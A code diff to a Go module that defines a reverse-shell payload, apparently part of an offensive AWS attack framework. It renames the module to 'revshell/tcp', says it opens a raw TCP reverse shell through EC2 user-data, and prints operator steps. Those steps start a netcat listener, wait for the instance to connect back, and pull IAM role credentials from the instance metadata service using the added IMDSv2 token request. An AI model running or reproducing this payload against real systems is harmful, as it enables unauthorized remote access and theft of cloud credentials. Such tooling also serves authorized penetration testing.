@@ -19,11 +19,11 @@ func init() {
 }
 
 func (p *ReverseShellPayload) GetName() string {
-	return "access/reverse-tcp"
+	return "revshell/tcp"
 }
 
 func (p *ReverseShellPayload) GetDescription() string {
-	return "Establish reverse shell connection for interactive access to EC2 instance credentials"
+	return "Establish a raw TCP reverse shell via EC2 user-data"
 }
 
 func (p *ReverseShellPayload) GetTags() []string {
@@ -133,7 +133,8 @@ func (p *ReverseShellPayload) ProcessResult(result string) (string, error) {
 	output.WriteString("1. Ensure your listener is running (e.g., nc -lvnp 4444)\n")
 	output.WriteString("2. Wait for the connection from the EC2 instance\n")
 	output.WriteString("3. Once connected, retrieve credentials from metadata service:\n")
-	output.WriteString("   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n")
+	output.WriteString("   TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 300')\n")
+	output.WriteString("   curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n")
 
 	output.WriteString("⚠ Note: Reverse shells may be blocked by security groups or NACLs\n")
 	output.WriteString("Ensure the EC2 instance can reach your listener IP and port\n")
@@ -143,7 +144,7 @@ func (p *ReverseShellPayload) ProcessResult(result string) (string, error) {
 
 func (p *ReverseShellPayload) Validate(options map[string]string) error {
 	if options["LISTENER_IP"] == "" {
-		return fmt.Errorf("LISTENER_IP is required for access/reverse-tcp payload")
+		return fmt.Errorf("LISTENER_IP is required for revshell/tcp payload")
 	}
 
 	shellType := options["SHELL_TYPE"]
